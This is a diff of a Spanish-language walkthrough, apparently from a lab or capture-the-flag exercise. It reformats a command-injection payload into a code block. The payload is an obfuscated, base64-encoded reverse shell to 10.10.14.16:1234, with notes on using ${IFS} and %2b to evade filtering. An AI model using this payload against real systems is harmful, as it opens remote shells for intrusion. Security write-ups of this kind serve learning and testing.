@@ -102,7 +102,10 @@ Ahora generaremos el payload que vamos a mandar al servidor.
 * Method: POST
 * payload: u=acl%2Fapt&u=$(command)
 
-En nuestro caso la string del comando `echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNi8xMjM0IDA%2bJjEn|base64${IFS}-d|bash`.
+En nuestro caso la string del comando
+```bash
+echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNi8xMjM0IDA%2bJjEn|base64${IFS}-d|bash
+```
 ${IFS} se usa para sustituir los espacios y %2b es para sustituir los simbolos + y que no se transformen en espacios.
 
 Con el listener levantado reciviremos la conexion.
